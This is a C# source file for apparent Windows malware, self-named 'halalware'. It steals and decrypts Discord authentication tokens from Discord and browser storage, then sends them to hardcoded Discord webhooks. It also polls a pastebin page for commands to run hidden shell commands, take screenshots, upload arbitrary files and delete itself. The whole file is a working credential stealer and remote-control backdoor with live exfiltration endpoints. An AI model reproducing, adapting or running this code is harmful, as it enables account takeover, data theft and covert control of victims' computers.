using System.Timers;
using System;
using System.Text;
using System.Net.Http;
using System.Net;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Linq;
using System.IO.Pipes;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Modes;
using System.Management;
using static Tools;

public static class Tools
{
    public delegate void FunctionInvoker();
    public static Task WaitAsync()
    {
        var tcs = new TaskCompletionSource();
        Console.CancelKeyPress += (sender, e) =>
        {
            e.Cancel = true;
            tcs.SetResult();
        };
        return tcs.Task;
    }

    public static void Wait()
    {
        using var manualResetEventSlim = new ManualResetEventSlim();
        Console.CancelKeyPress += (sender, e) =>
        {
            e.Cancel = true;
            manualResetEventSlim.Set();
        };
        manualResetEventSlim.Wait();
    }
    internal class Engine
    {
        private string AppDataRoaming { get; } = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        private string AppDataLocal { get; } = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        public string tempdata;
        private string EncryptedKey { get; set; }
        private Regex EncryptedKeyRegex { get; set; }
        private Regex NormalRegexPattern { get; set; }
        private Regex EncryptedRegexPattern { get; set; }
        private List<string> NormalTokens { get; set; }
        private List<string> EncryptedTokens { get; set; }
        private List<string> DecryptedTokens { get; set; }
        private Dictionary<string, string> DiscordPathInformation { get; set; }
        private Dictionary<string, string> DiscordTokenData { get; set; }

        public void Run()
        {
            this.EncryptedKeyRegex = new Regex("(?<key>[a-zA-Z0-9\\/\\+]{356})\"\\}\\}");
            this.NormalRegexPattern = new Regex(@"(?:[\w-]{24}([.])[\w-]{6}\1[\w-]{27}|mfa[.]\w{84})");
            this.EncryptedRegexPattern = new Regex("dQw4w9WgXcQ:[^\"]*");
            this.NormalTokens = new List<string>();
            this.EncryptedTokens = new List<string>();
            this.DecryptedTokens = new List<string>();
            this.DiscordPathInformation = new Dictionary<string, string>()
            {
                { "Discord",          AppDataRoaming + @"\discord\Local Storage\leveldb" },
                { "Discord(PTB)",     AppDataRoaming + @"\discordptb\Local Storage\leveldb" },
                { "Discord(Canary)",  AppDataRoaming + @"\discordcanary\Local Storage\leveldb" },
                { "Browser(Brave)",   AppDataLocal   + @"\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb" },
                { "Browser(Chrome)",  AppDataLocal   + @"\Google\Chrome\User Data\Default\Local Storage\leveldb" },
                { "Browser(Iridium)", AppDataLocal   + @"\Iridium\User Data\Default\Local Storage\leveldb"}
            };

            List<FunctionInvoker> functions = new List<FunctionInvoker>()
            {
                AcquireEncryptedKey,
                ExtractTokens,
                SendTokens
            };

            functions.ForEach(currentFunction => currentFunction.Invoke());
        }

        private void AcquireEncryptedKey()
        {
            try
            {
                string localStateContent = File.ReadAllText(AppDataRoaming + @"\discord\Local State");
                this.EncryptedKey = this.EncryptedKeyRegex.Match(localStateContent).Groups["key"].Value;
            }
            catch (DirectoryNotFoundException)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!] Cannot find {AppDataRoaming}\\discord\\Local State");
            }
        }

        private void ExtractTokens()
        {
            foreach (KeyValuePair<string, string> currentPath in this.DiscordPathInformation)
            {
                try
                {
                    foreach (string LDBFile in Directory.GetFiles(currentPath.Value, "*ldb"))
                    {
                        string LDBFileContent = File.ReadAllText(LDBFile);

                        foreach (Match normalTokenMatch in this.NormalRegexPattern.Matches(LDBFileContent))
                        {
                            this.NormalTokens.Add($"{currentPath.Key} => {normalTokenMatch.Value}");
                        }

                        foreach (Match encryptedTokenMatch in this.EncryptedRegexPattern.Matches(LDBFileContent))
                        {
                            this.EncryptedTokens.Add(encryptedTokenMatch.Value);
                        }
                    }
                }
                catch (DirectoryNotFoundException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[!] Directory for {currentPath.Key} not found.");
                    continue;
                }
            }

            for (int i = 0; i < this.EncryptedTokens.Count; i++)
            {
                this.DecryptedTokens.Add(DecryptToken(Convert.FromBase64String(EncryptedTokens[i].Split("dQw4w9WgXcQ:")[1])));
            }
        }

        private byte[] DecryptKey()
        {
            return ProtectedData.Unprotect(Convert.FromBase64String(this.EncryptedKey).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
        }

        public string DecryptToken(byte[] buff)
        {
            byte[] EncryptedData = buff.Skip(15).ToArray();
            AeadParameters Params = new(new KeyParameter(DecryptKey()), 128, buff.Skip(3).Take(12).ToArray(), null);
            GcmBlockCipher BlockCipher = new(new AesEngine());
            BlockCipher.Init(false, Params);
            byte[] DecryptedBytes = new byte[BlockCipher.GetOutputSize(EncryptedData.Length)];
            BlockCipher.DoFinal(DecryptedBytes, BlockCipher.ProcessBytes(EncryptedData, 0, EncryptedData.Length, DecryptedBytes, 0));
            return Encoding.UTF8.GetString(DecryptedBytes).TrimEnd("\r\n\0".ToCharArray());
        }

        private void SendTokens()
        {
            HashSet<string> Ltoken = new HashSet<string>(DecryptedTokens);

            foreach (string Dtoken in Ltoken)
            {
                tempdata += Dtoken + "\n";
            }
        }
    }
}
public class run_cmd
{
    public string command = "";
    public string temp = "";
    public bool end_cmd = false;
    public bool first_cmd = true;
    public string webhook_scr = "https://discord.com/api/webhooks/1136284717797347360/Jq50goaabk6Lt2B3RVQDyJg6luoE5x5-ARi-sYVW3V7gxOnYcfc-NsaATHxf29dpWiHT";
    public string webhook_log = "https://discord.com/api/webhooks/1137348914287222805/uE5VzAYtjkGsLlAZKaogjAOLRGQEHmIpYgd9oT2GunQ-Vfd9diQ7F_VlMOoQNH9BpI-R";
    public void start()
    {
        System.Timers.Timer timer = new System.Timers.Timer(15000);
        timer.Elapsed += (sender, e) =>
        {
            check_command();
            png_delete();
        };
        timer.Start();
        Tools.Wait();
    }
    private void png_delete()
    {
        if (File.Exists("C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\file.png"))
        {
            File.Delete("C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\file.png");
        }
    }
    public void send_log(string content)
    {
        HttpClient httpClient = new HttpClient();
        Dictionary<string, string> strs = new Dictionary<string, string>()
        {
            { "content", content },
            { "username", "halalware" },
            { "avatar_url", "https://cdn.discordapp.com/avatars/1132757640867491871/acad78f5bbc5f777975cdd7e1fda249c.webp?size=160" }
        };
        TaskAwaiter<HttpResponseMessage> awaiter = httpClient.PostAsync(webhook_log, new
        FormUrlEncodedContent(strs)).GetAwaiter();
        awaiter.GetResult();
    }
    public void check_command()
    {
        string url = "https://pastebin.com/raw/wjGKGNKL";
        using (WebClient client = new WebClient())
        {
            try
            {
                string response = client.DownloadString(url);
                if (response.Contains("cmd:"))
                {
                    command = response.Replace("cmd:", "");
                    cmd();
                    Console.WriteLine("cmd");
                }
                else if (response.Contains("screenshot:"))
                {
                    command = response;
                    screenshot();
                    Console.WriteLine("screenshot");
                }
                else if (response.Contains("upload:"))
                {
                    string filepath = response.Replace("upload:", "");
                    upload(filepath);
                }
                else if (response.Contains("suicide:"))
                {
                    suicide();
                }
                else if (response.Contains("tokens:"))
                {
                    command = response;
                    get_tokens();
                }
                else
                {
                    send_log("無効なコマンドです");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
    public void get_tokens()
    {
        if (command == temp)
        {
            Console.WriteLine("変化なし");
            goto skip;
        }
        else
        {
            temp = command;
        }
        Engine engine = new Engine();
        engine.Run();
        send_log("tokens\n" + engine.tempdata);
        skip:;
    }
    public async void upload(string filepath)
    {
        if (filepath == temp)
        {
            Console.WriteLine("変化なし");
            goto skip;
        }
        else
        {
            temp = filepath;
        }
        using (var content = new MultipartFormDataContent())
        {
            HttpClient client = new HttpClient();
            byte[] fileBytes = File.ReadAllBytes(filepath);
            content.Add(new ByteArrayContent(fileBytes), "file", Path.GetFileName(filepath));
            HttpResponseMessage response = await client.PostAsync(webhook_log, content);
            string responseContent = await response.Content.ReadAsStringAsync();
            //Console.WriteLine(responseContent);
        }
        skip:;
    }
    public void suicide()
    {
        File.WriteAllText(@"C:\Windows\Temp\suicide.bat", "taskkill /f /t /im shot.txt\r\ntaskkill /f /t /im interval.txt\r\ntimeout /t 5\r\nrd /s /q C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}");
        ProcessStartInfo psInfo = new ProcessStartInfo();
        psInfo.FileName = "C:\\Windows\\Temp\\suicide.bat";
        psInfo.CreateNoWindow = true;
        psInfo.UseShellExecute = false;
        Process p = Process.Start(psInfo);
        send_log("自己削除完了");
        Environment.Exit(0);
    }
    public void screenshot()
    {
        if (command == temp)
        {
            Console.WriteLine("変化なし");
            goto skip;
        }
        else
        {
            temp = command;
        }
        ProcessStartInfo psInfo = new ProcessStartInfo();
        psInfo.FileName = "cmd";
        psInfo.Arguments = "/c start C:\\ProgramData\\{e1d73f1e17251879702463fe6349a1c35026f865}\\shot.txt";
        psInfo.CreateNoWindow = true;
        psInfo.UseShellExecute = false;
        Process p = Process.Start(psInfo);
        skip:;
    }
    public async void cmd()
    {
        if (command == temp)
        {
            Console.WriteLine("変化なし");
            goto skip;
        }
        else
        {
            temp = command;
        }
        ProcessStartInfo psInfo = new ProcessStartInfo();
        psInfo.FileName = "cmd";
        psInfo.Arguments = "/c " + command.Replace("cmd:", "");
        psInfo.CreateNoWindow = true;
        psInfo.UseShellExecute = false;
        Process p = Process.Start(psInfo);
        send_log("コマンドを実行しました\n/c "+command);
        skip:;
    }
}

public class Program
{
    public static async Task Main(string[] args)
    {
        run_cmd run_Cmd = new run_cmd();
        run_Cmd.start();
    }
}